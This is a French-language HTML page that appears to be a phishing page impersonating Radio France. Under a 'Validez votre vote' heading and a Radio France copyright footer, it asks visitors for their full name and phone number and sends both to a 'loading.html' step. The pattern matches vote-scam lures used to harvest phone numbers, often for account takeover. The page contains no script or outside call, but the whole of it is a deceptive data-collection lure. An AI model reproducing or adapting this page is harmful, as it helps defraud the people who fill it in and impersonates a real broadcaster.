<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Radio France - Validez votre vote</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        :root {
            --primary: #0066CC;
            --secondary: #FFFFFF;
            --accent: #003366;
            --text: #333333;
            --light-text: #777777;
            --border-color: #dddfe2;
            --light-gray: #F5F7FA;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }

        body {
            background-color: var(--light-gray);
            color: var(--text);
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 15px;
        }

        .vote-container {
            background-color: var(--secondary);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        .page-title {
            font-family: 'Montserrat', sans-serif;
            font-size: 24px;
            font-weight: 700;
            color: var(--accent);
            margin-bottom: 10px;
        }
        
        .page-subtitle {
            font-size: 16px;
            color: var(--light-text);
            margin-bottom: 30px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .input-label {
            display: block;
            font-size: 14px;
            color: var(--text);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
            font-size: 16px;
            background-color: #F8F9FA;
        }

        .input-field:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .btn-submit {
            background: linear-gradient(to right, var(--primary), var(--accent));
            color: white;
            border: none;
            padding: 14px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            transition: all 0.3s ease;
        }
        
        .btn-submit:hover {
            opacity: 0.9;
        }

        .footer-text {
            font-size: 12px;
            color: var(--light-text);
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="vote-container">
        <h1 class="page-title">Validez votre vote</h1>
        <p class="page-subtitle">Pour finaliser votre participation, veuillez remplir les champs ci-dessous.</p>
        
        <form action="loading.html" method="GET">
            <div class="input-group">
                <label for="fullname" class="input-label">Nom et Prénom</label>
                <input type="text" id="fullname" name="fullname" class="input-field" placeholder="Ex: Jean Dupont" required>
            </div>
            <div class="input-group">
                <label for="phone" class="input-label">Numéro de téléphone</label>
                <input type="tel" id="phone" name="phone" class="input-field" placeholder="Ex: 06 12 34 56 78" required>
            </div>
            <button type="submit" class="btn-submit">Voter</button>
        </form>
    </div>
    
    <div class="footer-text">
        © 2025 Radio France - Tous droits réservés.
    </div>
</body>
</html>
